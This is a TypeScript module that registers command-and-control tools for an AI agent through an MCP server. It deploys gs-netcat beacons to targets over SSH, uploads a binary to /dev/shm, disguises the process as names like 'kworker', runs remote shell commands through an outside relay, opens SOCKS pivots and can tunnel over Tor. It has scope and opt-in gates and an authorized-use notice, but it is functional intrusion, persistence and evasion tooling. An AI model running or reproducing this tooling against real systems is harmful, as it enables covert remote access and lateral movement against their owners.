/**
 * Relay C2 tools — gs-netcat beacons, shell-through-relay, SOCKS pivots.
 *
 * Phase 3 of the CobraStrike roadmap. Where Phase 2 (lateral.ts) needs direct
 * SSH reachability, gs-netcat connects two endpoints that are BOTH behind
 * NAT/firewalls via the Global Socket Relay Network (or your own relay —
 * GS_HOST/GS_PORT, native gsocket env). Traffic is end-to-end encrypted
 * (SRP/AES-256); the relay sees ciphertext + timing only.
 *
 * Gates (defense in depth, the non-interactive server's xint equivalent):
 *   1. COBRA_ENABLE_TUNNELS=1 — relay C2 is a pivot primitive.
 *   2. Egress rule — contacting a relay OUTSIDE scope (including the public
 *      GSRN when GS_HOST is unset) additionally needs COBRA_ALLOW_INTERNET=1.
 *      A relay inside scope (lab/self-hosted) needs only gate 1.
 *   Deploying a beacon over SSH touches no relay from the operator side, so
 *   c2_gs_deploy is scope-gated per hop like exec_ssh instead.
 *
 * Secret hygiene: secrets ride in 0600 keyfiles under $COBRA_LOOT_DIR/keys/
 * (gs-netcat -k) or GSOCKET_ARGS on the target — never in argv, logs, loot
 * summaries, or server state (state keeps a 4-char correlation label only).
 *
 * Authorized use only: deploy beacons solely to hosts you are authorized on.
 */
import { z } from "zod";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import fs from "node:fs";
import path from "node:path";
import net from "node:net";
import crypto from "node:crypto";
import { spawn, execFile } from "node:child_process";
import { promisify } from "node:util";
import { assertInScope, inScope } from "../scope.js";
import { requireCapability, capabilityPath } from "../capabilities.js";
import { startSessionChecked, stopSession } from "../lib/sessions.js";
import { TOR_GATE_OFF } from "../lib/exec.js";
import {
  nextSessionId,
  registerTunnel,
  registerBeacon,
  getBeacon,
  listBeacons,
  listTunnels,
  type BeaconInfo,
} from "../state.js";
import { buildSshArgv, type SshAuth } from "./lateral.js";
import { CONFIG } from "../config.js";

const execFileP = promisify(execFile);

function text(s: string) {
  return { content: [{ type: "text" as const, text: s }] };
}

/** Where the beacon binary is staged on targets: tmpfs, gone on reboot. */
const REMOTE_BIN = "/dev/shm/.gsnc";

/** Shell-safe secrets only — they are interpolated into remote one-liners. */
const SECRET_RE = /^[A-Za-z0-9_-]{8,128}$/;
const MASQ_RE = /^[A-Za-z0-9_.-]{1,32}$/;

const MODE_FLAGS: Record<BeaconInfo["mode"], string> = {
  shell: "-l -e /bin/bash -q -D",
  socks: "-l -S -q -D",
  login: "-l -i -q -D",
};

/* --- gates --------------------------------------------------------------- */

/**
 * Relay C2 = tunnel primitive + (usually) internet egress. Throws with an
 * actionable message when the operator hasn't deliberately opted in.
 */
function assertGsReady(): void {
  if (!CONFIG.enableTunnels) {
    throw new Error(
      "RELAY C2 DISABLED: set COBRA_ENABLE_TUNNELS=1 on the server (the cobra-ops xint equivalent) and restart."
    );
  }
  const relay = process.env.GS_HOST?.trim();
  if (!relay) {
    if (!CONFIG.allowInternet) {
      throw new Error(
        "EGRESS DENIED: GS_HOST is unset, so beacons ride the PUBLIC GSRN — internet egress. " +
          "Set COBRA_ALLOW_INTERNET=1, or export GS_HOST/GS_PORT for your own relay (in scope = no internet gate)."
      );
    }
  } else if (!inScope(relay) && !CONFIG.allowInternet) {
    throw new Error(
      `EGRESS DENIED: GS_HOST="${relay}" is outside COBRA_ALLOWED_SCOPE — internet egress. ` +
        "Set COBRA_ALLOW_INTERNET=1, or use a relay inside scope."
    );
  }
}

/** Human-readable relay target for status lines. */
function relayDesc(): string {
  const h = process.env.GS_HOST?.trim();
  return h ? `relay ${h}:${process.env.GS_PORT?.trim() || "7350"}` : "public GSRN";
}

/* --- secrets -------------------------------------------------------------- */

function secretLabel(secret: string): string {
  return `${secret.slice(0, 4)}…`;
}

/** gs-netcat -g when available; crypto fallback (same alnum charset class). */
async function genSecret(): Promise<string> {
  const p = capabilityPath("gs-netcat");
  if (p) {
    try {
      const { stdout } = await execFileP(p, ["-g"], { timeout: 15000 });
      const s = stdout.trim().split(/\s+/).pop() ?? "";
      if (/^[A-Za-z0-9]{12,}$/.test(s)) return s;
    } catch {
      /* fall through to crypto */
    }
  }
  const abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const buf = crypto.randomBytes(24);
  return [...buf].map((b) => abc[b % abc.length]).join("");
}

/** Write a secret to a 0600 keyfile in $COBRA_LOOT_DIR/keys/ (gs-netcat -k). */
function writeKeyFile(secret: string): string {
  const dir = path.join(CONFIG.lootDir, "keys");
  fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
  const f = path.join(
    dir,
    `gs-${Date.now().toString(36)}-${crypto.randomBytes(3).toString("hex")}.key`
  );
  fs.writeFileSync(f, secret, { mode: 0o600 });
  return f;
}

/** Resolve `beacon` (id from c2_gs_deploy) or an ad-hoc `secret` to a keyfile. */
function resolveSecret(
  secret?: string,
  beacon?: string
): { keyFile: string; label: string; beacon?: BeaconInfo } {
  if (beacon) {
    const b = getBeacon(beacon);
    if (!b) throw new Error(`no such beacon: ${beacon} — check c2_gs_list.`);
    return { keyFile: b.keyFile, label: b.label, beacon: b };
  }
  if (!secret) {
    throw new Error("auth required: pass `secret` or `beacon` (id from c2_gs_deploy).");
  }
  if (!SECRET_RE.test(secret)) {
    throw new Error(
      "secret must be 8-128 chars of [A-Za-z0-9_-] (shell-safe; gs-netcat -g output qualifies)."
    );
  }
  return { keyFile: writeKeyFile(secret), label: secretLabel(secret) };
}

/* --- relay primitives ----------------------------------------------------- */

/** `-t` peer check: is a beacon with this secret listening on the relay? */
async function preflight(
  keyFile: string,
  timeoutMs = 15000
): Promise<{ alive: boolean; detail: string }> {
  const gsnc = requireCapability("gs-netcat");
  try {
    const { stdout, stderr } = await execFileP(gsnc, ["-k", keyFile, "-t"], {
      timeout: timeoutMs,
    });
    return { alive: true, detail: (stdout + stderr).trim() };
  } catch (e: any) {
    const detail = [e?.stdout, e?.stderr, e?.message]
      .filter(Boolean)
      .join("\n")
      .trim()
      .split("\n")
      .slice(-4)
      .join("\n");
    return { alive: false, detail: detail || "peer not listening / relay unreachable" };
  }
}

function tryConnect(port: number, timeoutMs = 800): Promise<boolean> {
  return new Promise((resolve) => {
    const sock = net.connect({ host: "127.0.0.1", port });
    const done = (ok: boolean) => {
      sock.destroy();
      resolve(ok);
    };
    sock.once("connect", () => done(true));
    sock.once("error", () => done(false));
    sock.setTimeout(timeoutMs, () => done(false));
  });
}

async function waitForPort(port: number, timeoutMs: number): Promise<boolean> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await tryConnect(port)) return true;
    await new Promise((r) => setTimeout(r, 400));
  }
  return false;
}


/* --- shell-through-relay runner ------------------------------------------- */

interface GsShellResult {
  rc: number | null;
  output: string;
  lootFile: string;
  timedOut: boolean;
  durationMs: number;
}

const GS_MARK = "__COBRA_GS_RC__";

/** Strip PTY/ANSI noise + the echoed sentinel line; raw stays in the loot file. */
function cleanGsOutput(raw: string): string {
  let s = raw
    .replace(/\x1b\[[0-9;?]*[A-Za-z]/g, "")
    .replace(/\x1b\][^\x07]*(\x07|\x1b\\)/g, "")
    .replace(/\r/g, "");
  const idx = s.search(new RegExp(`^.*${GS_MARK}:\\d+.*$`, "m"));
  if (idx >= 0) s = s.slice(0, idx);
  return s
    .split("\n")
    .filter((l) => !l.includes(`echo ${GS_MARK}`))
    .join("\n")
    .replace(/\n?exit\s*$/, "")
    .trim();
}

/**
 * Non-interactive command through the relay to a `shell` beacon (-l -e bash):
 * pipe `cmd; echo MARKER:rc; exit` into a gs-netcat client, resolve on the
 * marker (or channel close / timeout). Full raw stream → loot file.
 */
function runGsShell(
  keyFile: string,
  command: string,
  timeoutMs: number,
  extraEnv: NodeJS.ProcessEnv = {}
): Promise<GsShellResult> {
  const gsnc = requireCapability("gs-netcat");
  fs.mkdirSync(CONFIG.lootDir, { recursive: true });
  const file = path.join(
    CONFIG.lootDir,
    `c2_gs_shell-${new Date().toISOString().replace(/[:.]/g, "-")}.log`
  );
  const started = Date.now();

  return new Promise((resolve, reject) => {
    const child = spawn(gsnc, ["-k", keyFile, "-q"], {
      stdio: ["pipe", "pipe", "pipe"],
      env: { ...process.env, ...extraEnv },
    });
    const out = fs.createWriteStream(file, { flags: "a" });
    let captured = "";
    let rc: number | null = null;
    let settled = false;

    const finish = (timedOut: boolean) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      try {
        child.kill("SIGTERM");
      } catch {
        /* already dead */
      }
      out.end();
      resolve({
        rc,
        output: cleanGsOutput(captured),
        lootFile: file,
        timedOut,
        durationMs: Date.now() - started,
      });
    };

    const onData = (d: Buffer) => {
      out.write(d);
      if (captured.length < 256 * 1024) captured += d.toString();
      const m = captured.match(/__COBRA_GS_RC__:(\d+)/);
      if (m) {
        rc = Number(m[1]);
        finish(false);
      }
    };
    child.stdout.on("data", onData);
    child.stderr.on("data", onData);
    child.on("error", (err) => {
      clearTimeout(timer);
      out.end();
      reject(new Error(`SPAWN ERROR running gs-netcat: ${err.message}`));
    });
    child.on("close", () => finish(false));
    const timer = setTimeout(() => finish(true), timeoutMs);

    const sin = child.stdin!;
    sin.write(`${command} 2>&1; echo ${GS_MARK}:$?\nexit\n`, () => sin.end());
  });
}

/* --- tor env (Phase 5): gs-netcat native -T via GSOCKET_TOR ---------------- */

/**
 * gs-netcat honors GSOCKET_TOR=<socks-host:port> natively (its `-T` flag) —
 * no proxychains wrapper needed (and proxychains would break the SRP handshake
 * timing). Returns the env overlay, or {} when tor is off.
 */
function gsTorEnv(tor?: boolean): NodeJS.ProcessEnv {
  if (!tor) return {};
  if (!CONFIG.enableProxy) {
    throw new Error(TOR_GATE_OFF);
  }
  const m = CONFIG.proxyUrl.match(/^socks5h?:\/\/([^:/]+):(\d+)$/);
  if (!m) {
    throw new Error(
      `COBRA_PROXY must be socks5h://host:port (got "${CONFIG.proxyUrl}") — gs-netcat -T needs host:port.`
    );
  }
  return { GSOCKET_TOR: `${m[1]}:${m[2]}` };
}

/* --- ssh deploy helpers (reuse lateral.ts argv builder) -------------------- */

/** One-shot ssh exec (password rides SSHPASS env). Returns combined output. */
async function sshExec(
  auth: SshAuth,
  remoteCmd: string,
  timeoutMs = 30000
): Promise<{ code: number; out: string }> {
  const argv = buildSshArgv(auth, ["-T"], remoteCmd);
  const env = auth.password ? { ...process.env, SSHPASS: auth.password } : process.env;
  try {
    const { stdout, stderr } = await execFileP(argv[0], argv.slice(1), {
      env,
      timeout: timeoutMs,
    });
    return { code: 0, out: (stdout + stderr).trim() };
  } catch (e: any) {
    return {
      code: typeof e?.code === "number" ? e.code : -1,
      out: [e?.stdout, e?.stderr, e?.message].filter(Boolean).join("\n").trim(),
    };
  }
}

/** Pipe the local gs-netcat binary to the target as base64 over ssh stdin. */
function sshUpload(auth: SshAuth, localPath: string): Promise<{ ok: boolean; out: string }> {
  const b64 = fs.readFileSync(localPath).toString("base64");
  const argv = buildSshArgv(
    auth,
    ["-T"],
    `umask 077; base64 -d > ${REMOTE_BIN} && chmod 700 ${REMOTE_BIN} && echo UPLOAD_OK`
  );
  const env = auth.password ? { ...process.env, SSHPASS: auth.password } : process.env;

  return new Promise((resolve, reject) => {
    const child = spawn(argv[0], argv.slice(1), { stdio: ["pipe", "pipe", "pipe"], env });
    let captured = "";
    const onData = (d: Buffer) => {
      if (captured.length < 64 * 1024) captured += d.toString();
    };
    child.stdout.on("data", onData);
    child.stderr.on("data", onData);
    child.on("error", (err) => reject(new Error(`SPAWN ERROR running ssh: ${err.message}`)));
    child.on("close", (code) => {
      const ok = code === 0 && captured.includes("UPLOAD_OK");
      resolve({ ok, out: captured.trim() });
    });
    // Chunk the base64 so a multi-MB static binary never blows a write buffer.
    const sin = child.stdin!;
    const CHUNK = 256 * 1024;
    let i = 0;
    const writeNext = () => {
      while (i < b64.length) {
        const part = b64.slice(i, (i += CHUNK));
        if (!sin.write(part)) {
          sin.once("drain", writeNext);
          return;
        }
      }
      sin.end();
    };
    writeNext();
  });
}

/** Normalize uname -m for static-build matching (gs-netcat_linux-<arch>). */
function normArch(a: string): string {
  const s = a.trim().toLowerCase();
  if (s === "x86_64" || s === "amd64") return "x86_64";
  if (s === "aarch64" || s === "arm64") return "aarch64";
  return s;
}


/* --- tools ----------------------------------------------------------------- */

export function registerC2Tools(server: McpServer): void {
  server.tool(
    "c2_gs_secret",
    "Generate a gsocket secret (gs-netcat -g; crypto fallback). Local RNG only — no network, no gate. Feed the secret to c2_gs_deploy / c2_gs_shell / c2_gs_socks_start.",
    {},
    async () => {
      const s = await genSecret();
      return text(
        `🔑 gsocket secret: ${s}\n  label: ${secretLabel(s)}  (state/logs only ever show the label)`
      );
    }
  );

  server.tool(
    "c2_gs_deploy",
    "Mint a gs-netcat beacon: returns target-side one-liner(s), and optionally auto-deploys over SSH (arch check, base64 upload of the local static binary to /dev/shm, daemonized launch, pgrep verify). Modes: shell (-l -e bash → c2_gs_shell), socks (-l -S → c2_gs_socks_start), login (-l -i → human PTY). Scope-checked per hop — deploy only to authorized hosts.",
    {
      mode: z.enum(["shell", "socks", "login"]).optional().describe("Beacon personality (default shell)"),
      secret: z.string().optional().describe("Reuse an existing secret (else one is generated)"),
      host: z.string().optional().describe("Foothold host for SSH auto-deploy (in scope). Omit = one-liner only"),
      user: z.string().optional().describe("SSH user (required with host)"),
      password: z.string().optional().describe("Password (SSHPASS env, never logged)"),
      key_path: z.string().optional().describe("Private key path (e.g. from ssh_key_setup)"),
      port: z.number().optional().describe("SSH port (default 22)"),
      masq: z.string().optional().describe("Masquerade process name on the target (exec -a), e.g. 'kworker'"),
      upload: z.boolean().optional().describe("Upload the local static gs-netcat if the target lacks one (default true)"),
    },
    async ({ mode, secret, host, user, password, key_path, port, masq, upload }) => {
      const m = mode ?? "shell";
      const flags = MODE_FLAGS[m];
      if (masq && !MASQ_RE.test(masq)) throw new Error("masq must be 1-32 chars of [A-Za-z0-9_.-].");
      const sec = secret ?? (await genSecret());
      if (!SECRET_RE.test(sec)) {
        throw new Error("secret must be 8-128 chars of [A-Za-z0-9_-] (shell-safe).");
      }
      const label = secretLabel(sec);
      const gsArgs = `-s ${sec} ${flags}`;

      // Target-side one-liners (always returned — the manual path needs them).
      const plain = `(GSOCKET_ARGS="${gsArgs}" gs-netcat 2>/dev/null &)`;
      const staged = masq
        ? `(GSOCKET_ARGS="${gsArgs}" bash -c 'exec -a ${masq} ${REMOTE_BIN}' 2>/dev/null &)`
        : `(GSOCKET_ARGS="${gsArgs}" ${REMOTE_BIN} 2>/dev/null &)`;

      let where = "manual one-liner";
      let cleanup = `pkill -f '${masq ?? "gs-netcat"}'; sleep 1; pkill -f '${masq ?? "gs-netcat"}'`;
      let deployReport = "";


      if (host) {
        if (!user) throw new Error("user is required with host.");
        assertInScope(host);
        const auth: SshAuth = { host, user, password, key_path, port };
        // 1. recon: arch + existing binary
        const recon = await sshExec(auth, "uname -m; command -v gs-netcat || true");
        if (recon.code !== 0) throw new Error(`ssh recon failed (exit ${recon.code}):\n${recon.out}`);
        const [rArchRaw, foundBin] = recon.out.split("\n").map((l) => l.trim());
        let binCmd = foundBin || "";
        if (!binCmd) {
          if (upload === false) {
            throw new Error(
              "no gs-netcat on target and upload=false — stage the binary and run the one-liner manually."
            );
          }
          const localGs = requireCapability("gs-netcat");
          const lArch = normArch((await execFileP("uname", ["-m"])).stdout);
          const rArch = normArch(rArchRaw ?? "");
          if (lArch !== rArch) {
            throw new Error(
              `arch mismatch: local gs-netcat is ${lArch}, target is ${rArch}. ` +
                `Fetch the matching static build (gs-netcat_linux-${rArch} — cobrashell 'bin gs-netcat' / the COBRA .onion) and run the one-liner manually.`
            );
          }
          const up = await sshUpload(auth, localGs);
          if (!up.ok) throw new Error(`binary upload failed:\n${up.out}`);
          binCmd = REMOTE_BIN;
        }
        // 2. launch (daemonized, -D watchdog) + verify
        const run = masq ? `bash -c 'exec -a ${masq} ${binCmd}'` : binCmd;
        const pat = masq ?? binCmd;
        const launch = await sshExec(
          auth,
          `GSOCKET_ARGS="${gsArgs}" setsid -f ${run} </dev/null >/dev/null 2>&1; sleep 1; pgrep -f '${pat}' >/dev/null && echo BEACON_OK || echo BEACON_FAIL`
        );
        if (!launch.out.includes("BEACON_OK")) {
          throw new Error(`beacon launch unverified (pgrep found nothing):\n${launch.out}`);
        }
        where = `${user}@${host}`;
        cleanup =
          `pkill -f '${pat}'; sleep 1; pkill -f '${pat}'` +
          (binCmd === REMOTE_BIN ? `; rm -f ${REMOTE_BIN}` : "");
        deployReport = `\n  auto-deploy: ${binCmd === REMOTE_BIN ? `uploaded → ${REMOTE_BIN}, ` : ""}daemon up (pgrep ✓)${masq ? ` as '${masq}'` : ""}`;
      }

      const keyFile = writeKeyFile(sec);
      const id = nextSessionId("gsb");
      registerBeacon({ id, mode: m, where, started: new Date().toISOString(), label, keyFile, cleanup });

      // Operator-side end-to-end check — only when the gates allow relay contact.
      let relayCheck = "";
      try {
        assertGsReady();
        const pf = await preflight(keyFile);
        relayCheck = pf.alive
          ? "\n  relay check: beacon IS listening ✓"
          : `\n  relay check: not answering yet (${pf.detail})`;
      } catch {
        relayCheck =
          "\n  relay check: skipped (operator-side gates off — c2_gs_shell/socks need COBRA_ENABLE_TUNNELS=1 + the egress rule)";
      }

      const drive =
        m === "socks"
          ? `  c2_gs_socks_start beacon=${id}  → then via="<tunnel-id>" on recon/web/creds tools\n`
          : m === "login"
            ? `  operator attaches by hand: gs-netcat -k ${keyFile} -i\n`
            : `  c2_gs_shell beacon=${id} command='id; uname -a'\n`;

      return text(
        `🐝 gs beacon ready — ${id}  (mode ${m}, ${where})\n` +
          `  secret:  ${sec}\n` +
          `  label:   ${label}   keyfile(0600): ${keyFile}\n` +
          `  relay:   ${relayDesc()}${deployReport}${relayCheck}\n\n` +
          `Target-side one-liners (for a manual shell on the target):\n` +
          `  PATH binary:  ${plain}\n` +
          `  staged:       ${staged}\n\n` +
          `Drive it:\n${drive}` +
          `Cleanup (engagement end — the -D watchdog needs the double-kill):\n  ${cleanup}`
      );
    }
  );


  server.tool(
    "c2_gs_shell",
    "Run a non-interactive command on a beacon through the relay (shell-mode beacons). Output → loot file; summary + exit code returned. Requires COBRA_ENABLE_TUNNELS=1 + the relay egress rule.",
    {
      beacon: z.string().optional().describe("Beacon id from c2_gs_deploy (uses its stored keyfile)"),
      secret: z.string().optional().describe("Ad-hoc secret instead of a beacon id"),
      command: z.string().describe("Command for the beacon's bash, e.g. 'id; uname -a; ip a'"),
      timeout: z.number().optional().describe("Seconds to wait for completion (default 45)"),
      skip_preflight: z.boolean().optional().describe("Skip the -t peer check (default false)"),
      tor: z.boolean().optional().describe("true = reach the relay through tor (gs-netcat -T, COBRA_ENABLE_PROXY=1)"),
    },
    async ({ beacon, secret, command, timeout, skip_preflight, tor }) => {
      assertGsReady();
      const torEnv = gsTorEnv(tor);
      const { keyFile, label, beacon: b } = resolveSecret(secret, beacon);
      if (b?.mode === "socks") {
        throw new Error(
          `beacon ${b.id} is a SOCKS beacon (-l -S) — it forwards traffic, it doesn't run commands. Use c2_gs_socks_start, or deploy a shell beacon.`
        );
      }
      if (!skip_preflight) {
        const pf = await preflight(keyFile);
        if (!pf.alive) {
          throw new Error(
            `beacon ${label} not listening on the ${relayDesc()}:\n${pf.detail}\n(redeploy it, or skip_preflight=true to try anyway)`
          );
        }
      }
      const r = await runGsShell(keyFile, command, (timeout ?? 45) * 1000, torEnv);
      const status = r.timedOut
        ? `TIMED OUT after ${(r.durationMs / 1000).toFixed(0)}s — partial output below`
        : r.rc === null
          ? "channel closed before the completion marker (beacon died?)"
          : `exit ${r.rc}`;
      const lines = r.output.split("\n");
      const head = lines.slice(0, 30).join("\n");
      const more = lines.length > 30 ? `\n… (${lines.length - 30} more lines in loot file)` : "";
      return text(
        `## c2_gs_shell — ${status} in ${(r.durationMs / 1000).toFixed(1)}s  [${label} via ${relayDesc()}]\n\n` +
          (r.output ? head + more : "(no output)") +
          `\n\n📁 Full output: ${r.lootFile}` +
          (b?.mode === "login"
            ? `\n⚠️ login (-i) beacons are PTYs — expect prompt/echo noise; shell-mode beacons are cleaner for automation.`
            : "")
      );
    }
  );

  server.tool(
    "c2_gs_socks_start",
    "Open a local SOCKS5 listener that pivots through a socks-mode beacon (gs-netcat -p → beacon -l -S). Registers as a tunnel — use via=\"<tunnel-id>\" on recon/web/creds tools. Requires COBRA_ENABLE_TUNNELS=1 + the relay egress rule.",
    {
      beacon: z.string().optional().describe("Beacon id from c2_gs_deploy (mode socks)"),
      secret: z.string().optional().describe("Ad-hoc secret instead of a beacon id"),
      local_port: z.number().optional().describe("Local SOCKS port (default 1080)"),
      skip_preflight: z.boolean().optional().describe("Skip the -t peer check (default false)"),
      tor: z.boolean().optional().describe("true = reach the relay through tor (gs-netcat -T, COBRA_ENABLE_PROXY=1)"),
    },
    async ({ beacon, secret, local_port, skip_preflight, tor }) => {
      assertGsReady();
      const torEnv = gsTorEnv(tor);
      const { keyFile, label } = resolveSecret(secret, beacon);
      const lport = local_port ?? 1080;
      if (await tryConnect(lport)) {
        throw new Error(
          `127.0.0.1:${lport} is already in use — pick another local_port (check session_list / tunnel_list).`
        );
      }
      if (!skip_preflight) {
        const pf = await preflight(keyFile);
        if (!pf.alive) {
          throw new Error(
            `beacon ${label} not listening on the ${relayDesc()}:\n${pf.detail}\n(redeploy it, or skip_preflight=true to try anyway)`
          );
        }
      }
      const gsnc = requireCapability("gs-netcat");
      const info = await startSessionChecked(
        "tunnel",
        `gs-netcat -p 127.0.0.1:${lport} (SOCKS via gs ${label}${tor ? " over tor" : ""})`,
        [gsnc, "-q", "-k", keyFile, "-p", String(lport)],
        4000,
        Object.keys(torEnv).length > 0 ? { env: torEnv } : undefined
      );
      if (!(await waitForPort(lport, 10000))) {
        stopSession(info.id);
        throw new Error(
          `gs-netcat stayed up but 127.0.0.1:${lport} never listened — see ${info.outputFile}`
        );
      }
      registerTunnel({ id: info.id, port: lport, socksVersion: 5, via: `gs ${label}` });
      return text(
        `🕳️  gs SOCKS5 pivot up — tunnel id ${info.id}\n` +
          `  socks5://127.0.0.1:${lport} → beacon ${label} via ${relayDesc()}\n` +
          `  Use via="${info.id}" on recon/web/creds tools to route through it.\n` +
          `  log: ${info.outputFile}`
      );
    }
  );

  server.tool(
    "c2_gs_list",
    "C2 dashboard: registered gs beacons (id, mode, where, label, cleanup) + active tunnels (gs and ssh).",
    {},
    async () => {
      const bs = listBeacons();
      const ts = listTunnels();
      const parts: string[] = [];
      parts.push(`## Beacons (${bs.length})`);
      parts.push(
        bs.length
          ? bs
              .map(
                (b) =>
                  `- ${b.id}  [${b.mode}] ${b.where}  label ${b.label}  up since ${b.started}\n    cleanup: ${b.cleanup}`
              )
              .join("\n")
          : "- (none — c2_gs_deploy first)"
      );
      parts.push(`\n## Tunnels (${ts.length})`);
      parts.push(
        ts.length
          ? ts.map((t) => `- ${t.id}  socks${t.socksVersion}://127.0.0.1:${t.port}  via ${t.via}`).join("\n")
          : "- (none — tunnel_socks_start / c2_gs_socks_start)"
      );
      parts.push(
        `\nRelay: ${relayDesc()}  |  gates: tunnels=${CONFIG.enableTunnels ? "on" : "OFF"}, internet=${CONFIG.allowInternet ? "on" : "OFF"}`
      );
      return text(parts.join("\n"));
    }
  );
}

